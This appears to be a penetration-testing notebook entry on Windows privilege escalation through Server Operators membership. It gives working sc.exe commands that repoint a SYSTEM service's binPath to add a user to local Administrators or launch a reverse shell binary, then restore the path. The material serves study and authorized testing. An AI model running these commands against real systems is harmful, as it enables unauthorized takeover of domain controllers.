---
created: 2026-07-22
updated: 2026-09-20
tags:
  - Windows
  - Windows_PrivEsc
status: complete
---

> [!abstract]+ **Scope**: Privilege escalation through membership in the `Server Operators` group.

- [ ] Confirm membership in the `Server Operators` group (`whoami /groups` or `net user %USERNAME% /domain`).
- [ ] Check active token status for `SeBackupPrivilege` and `SeRestorePrivilege` (`whoami /priv`).
- [ ] Identify a target service running as `SYSTEM` (`sc.exe qc` or `PsService.exe`).
- [ ] Reconfigure the service binary path (`binPath`) using `sc.exe config`.
- [ ] Start the service (`sc.exe start`) to execute commands under `NT AUTHORITY\SYSTEM`.
- [ ] Verify elevated access and restore the service binary path.
---
## `Server Operators`

>The **`Server Operators`** group is a built-in Windows security group that allows members to **administer domain controllers and core server services** without full Domain Admins membership.

- Members of `Server Operators` have permissions to create, configure, start, and stop Windows services running on Domain Controllers.
- Windows also assigns **`SeBackupPrivilege`** and **`SeRestorePrivilege`** to members of `Server Operators` by default, granting file read and write access under backup semantics.
- Reconfiguring a service's binary path (`binPath`) to execute a custom command executes that command under `NT AUTHORITY\SYSTEM` when the service starts.

> [!note] See [[SeBackupPrivilege & SeRestorePrivilege]] for privilege escalation via backup semantics, and [[🛠️ Weak service permissions]] for general service configuration abuse.

## Checking group membership

- Check whether your current user is a member of `Server Operators`:

```powershell
whoami /groups
```

```cmd
net user %USERNAME% /domain
```

- Verify assigned privileges:

```powershell
whoami /priv
```

>[!note] Even if the privileges are present in the output but marked `Disabled`, Windows won't consider them during access checks. You need to enable the privileges first before using them. See [[SeBackupPrivilege & SeRestorePrivilege#Enumerating and enabling privileges]].

## Modifying service binary paths for SYSTEM execution

- Windows services running as `NT AUTHORITY\SYSTEM` execute commands specified in their binary path (`binPath`).
- Because `Server Operators` members have permissions to modify service configurations (`SERVICE_CHANGE_CONFIG` and `SERVICE_ALL_ACCESS`), changing a service's `binPath` to a custom command triggers execution with `SYSTEM` rights when the service starts.

1. Query the service configuration of target services (such as `AppReadiness`) using `sc.exe qc`:

```powershell
sc.exe qc AppReadiness
```

> [!note] In PowerShell, `sc` is an alias for `Set-Content`. Always specify `sc.exe` when executing the Windows Service Control utility.

2. Inspect service permissions using Sysinternals `PsService.exe`:

```cmd
PsService.exe security AppReadiness
```

- Look for `[ALLOW] BUILTIN\Server Operators` with `All` or `SERVICE_ALL_ACCESS` rights in the output.

3. Reconfigure the target service `binPath` to add your current user account to the local `Administrators` group:

```powershell
sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators jdoe /add"
```

- Alternatively, reconfigure the binary path to execute a reverse shell binary on the target disk:

```powershell
sc.exe config AppReadiness binPath= "C:\Windows\Temp\shell.exe"
```

4. Start the reconfigured service to trigger code execution:

```powershell
sc.exe start AppReadiness
```

- The service launch may return an error code (`1053` or `1058`) because the command doesn't interact with the Service Control Manager interface. However, the command string executes before the process terminates.

5. Check local group membership to confirm successful elevation:

```powershell
net localgroup Administrators
```

>[!tip]+
> - Restore the service binary path to its original system executable after completing elevation:
>
> ```powershell
> sc.exe config AppReadiness binPath= "C:\Windows\System32\svchost.exe -k AppReadiness -p"
> ```

## References and further reading

- [`Server Operators — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-security-groups-in-active-directory#server-operators)
- [`Weak service permissions — Quartz`](https://0xtr1gger.github.io/trigger_book/)
- [`Windows Privilege Escalation: Server Operator Group — Hacking Articles`](https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/)